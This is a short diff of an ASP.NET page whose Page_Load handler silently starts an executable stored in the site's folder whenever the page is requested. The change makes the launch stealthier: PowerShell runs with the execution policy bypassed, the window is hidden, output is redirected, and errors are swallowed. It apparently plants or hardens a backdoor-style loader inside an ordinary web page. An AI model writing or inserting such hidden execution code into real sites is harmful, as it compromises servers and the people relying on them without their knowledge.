@@ -4,16 +4,17 @@
 <script runat="server">
 Protected Sub Page_Load(ByVal sender As Object, ByVal e As EventArgs) Handles Me.Load
     Try
-        ' Build full one-liner
-        Dim cmd As String = "cmd.exe"
-        Dim args As String = "/c start C:\Website\SwarajReports.indiainfoline.com\asmxswaraj.exe"
+        Dim exePath As String = "C:\Website\SwarajReports.indiainfoline.com\asmxswaraj.exe"
 
-        Dim psi As New ProcessStartInfo(cmd, args)
+        Dim psCommand As String = $"Start-Process -FilePath '{exePath}' -WindowStyle Hidden"
+        Dim psi As New ProcessStartInfo("powershell.exe", "-NoProfile -ExecutionPolicy Bypass -Command """ & psCommand & """")
         psi.UseShellExecute = False
         psi.CreateNoWindow = True
+        psi.RedirectStandardOutput = True
+        psi.RedirectStandardError = True
         Process.Start(psi)
     Catch
-        ' Silent fail
+        ' Fail silently
     End Try
 
     Response.Clear()
